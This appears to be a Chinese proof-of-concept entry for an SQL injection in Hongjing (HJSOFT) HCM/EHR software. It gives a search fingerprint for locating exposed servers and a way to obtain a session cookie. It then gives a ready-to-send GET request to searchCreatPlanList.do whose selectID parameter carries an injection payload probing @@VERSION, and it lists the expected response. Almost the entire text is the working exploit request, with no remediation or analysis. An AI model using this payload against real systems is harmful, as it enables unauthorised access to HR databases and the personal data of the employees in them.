# 宏景EHRsearchCreatPlanList.do存在SQL注入漏洞

宏景 ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /templates/index/getpassword.jsp HTTP/1.1`

**Payload**
```
获取cookie
Host:
携带cookie访问
GET /train/plan/searchCreatPlanList.do?b_selectPlan=query&selectID=1'%2B(1-@@VERSION)%2B')--+ HTTP/1.1
Host:
Cookie: JSESSIONID=D3D69E3D8D5CD86DC4B10E91CD2062AB
```
- **响应特征**：200